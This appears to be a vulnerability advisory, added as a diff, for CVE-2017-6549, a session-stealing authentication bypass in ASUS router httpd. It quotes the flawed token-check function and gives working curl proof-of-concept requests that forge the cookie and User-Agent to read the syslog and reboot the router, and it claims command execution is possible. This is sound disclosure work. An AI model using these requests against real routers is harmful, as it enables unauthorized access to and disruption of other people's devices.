@@ -1,0 +1,56 @@
+Session Stealing
+
+Component: httpd
+
+CVE: CVE-2017-6549
+
+Vulnerability:
+
+httpd uses the function search_token_in_list to validate if a user is logged into the admin interface by checking his asus_token value. There seems to be a branch which could be a failed attempt to build in a logout functionality.
+
+asus_token_t* search_token_in_list(char* token, asus_token_t **prev)
+{
+    asus_token_t *ptr = head;
+    asus_token_t *tmp = NULL;
+    int found = 0;
+    char *cp = NULL;
+
+    while(ptr != NULL)
+    {
+        if(!strncmp(token, ptr->token, 32)) {
+            found = 1;
+            break;
+        }
+        else if(strncmp(token, "cgi_logout", 10) == 0) {
+            cp = strtok(ptr->useragent, "-");
+
+            if(strcmp(cp, "asusrouter") != 0) {
+                found = 1;
+                break;
+            }
+        }
+        else {
+            tmp = ptr;
+            ptr = ptr->next;
+        }
+    }
+    
+    if(found == 1) {
+        if(prev)
+            *prev = tmp;
+        return ptr;
+    }   
+    else {
+        return NULL;
+    }
+}
+If an attacker sets his cookie value to cgi_logout and puts asusrouter-Windows-IFTTT-1.0 into his User-Agent header he will be treated as signed-in if any other administrator session is active.
+
+PoC:
+
+# read syslog
+curl -H 'User-Agent: asusrouter-Windows-IFTTT-1.0' -H 'Cookie: asus_token=cgi_logout' http://192.168.1.1/syslog.txt
+
+#reboot router
+curl -H 'User-Agent: asusrouter-Windows-IFTTT-1.0' -H 'Cookie: asus_token=cgi_logout' http://192.168.1.1/apply.cgi1 -d 'action_mode=reboot&action_script=&action_wait=70'
+It’s possible to execute arbitrary commands on the router if any admin session is currently active.
